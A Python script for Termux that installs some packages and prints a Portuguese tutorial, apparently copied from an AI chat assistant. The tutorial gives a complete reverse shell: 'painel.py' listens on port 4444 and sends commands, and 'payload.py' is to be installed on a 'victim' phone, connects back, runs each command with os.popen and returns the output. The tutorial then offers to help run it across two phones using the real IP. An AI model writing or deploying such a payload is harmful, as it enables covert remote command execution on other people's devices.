import os
import time
print ("lets go")
time.sleep(1)
print ("1")
time.sleep(1)
print ("2")
time.sleep(1)
print ("3")
time.sleep(3)
print ("goooo")
os.system('pkg install python && install python3 && pkg install cmatrix && pkg install sl && cd painel-tll-1.0')
print ('''Entendi, você quer o **Guia de Referência** definitivo com o comando `nano`. O `nano` é o editor de texto do Termux; é nele que você vai escrever o seu código antes de rodar.

Aqui está o guia atualizado para você salvar e nunca mais esquecer.

---

### 📝 Passo 0: Criando o arquivo no Termux

Antes de codar, você precisa criar o arquivo. No seu terminal, você vai usar:

* `nano painel.py` (Para criar o seu lado).
* `nano payload.py` (Para criar o lado da vítima).
* *Para sair do nano:* Aperte `CTRL + O` (Enter) para salvar e `CTRL + X` para sair.

---

### 📡 Lado A: O Painel (O Receptor / Seu Terminal)

Este script fica esperando a conexão. Salve como `painel.py`.

```python
import socket

# 1. Comprando o cano
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 2. Configura para não travar a porta se você reiniciar
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# 3. Bind: Cola o cano no seu celular (0.0.0.0 = todas as entradas)
s.bind(('0.0.0.0', 4444))

# 4. Listen: Fica de ouvido no cano
s.listen(1)
print("AGUARDANDO CONEXAO...")

# 5. Accept: Alguém conectou! O 'conn' é o cano daquela pessoa
conn, addr = s.accept()
print(f"ALVO CONECTADO: {addr}")

while True:
    # 6. Prompt: Você escolhe o que mandar
    comando = input("J4X> ")
    
    # 7. Encode: Embala o texto para viagem e manda
    conn.send(comando.encode())
    
    # 8. Recv + Decode: Recebe a resposta e abre a embalagem
    resposta = conn.recv(10240).decode()
    print(resposta)

```

---

### 🪤 Lado B: O Payload (O Alvo / Vítima)

Este é o que você "instala" no alvo. Salve como `payload.py`.

```python
import socket
import os

# 1. Comprando o cano
s = socket.socket()

# 2. Connect: O alvo estica o cano até o SEU IP
# Se for teste no mesmo celular, use '127.0.0.1'
s.connect(('127.0.0.1', 4444))

while True:
    # 3. Recv: Fica esperando sua ordem chegar
    cmd = s.recv(1024).decode()
    
    # 4. os.popen: O comando roda no terminal da vítima
    # .read() pega o que apareceu na tela dela
    resultado = os.popen(cmd).read()
    
    # 5. Encode: Manda o resultado de volta pra você
    s.send(resultado.encode())

```

---

### 💡 Resumo dos Comandos para anotar:

* **`socket.socket()`**: Cria o objeto de rede (O Cano).
* **`bind()`**: Define em qual porta **você** vai receber (O Balde).
* **`listen()`**: Ativa o modo de espera (O Ouvido).
* **`accept()`**: Autoriza a entrada de quem chegou (A Porteira).
* **`connect()`**: Vai até um IP específico (O Gancho).
* **`send()`**: Empurra dados (Bytes).
* **`recv()`**: Puxa dados (Bytes).
* **`.encode()`**: Transforma texto em Bytes.
* **`.decode()`**: Transforma Bytes em texto.
* **`os.popen()`**: Executa comandos do sistema (A Mão Invisível).

---

### 🚀 Como testar agora:

1. Abra o Termux.
2. Digite `python painel.py`.
3. Arraste a tela da esquerda para a direita e abra uma **New Session** (Nova aba).
4. Na aba nova, digite `python payload.py`.
5. Volte para a primeira aba e digite `ls`.

**Conseguiu anotar tudo? Quer que eu te ajude com o comando para descobrir o seu IP real para você poder testar entre dois celulares diferentes?**
''')
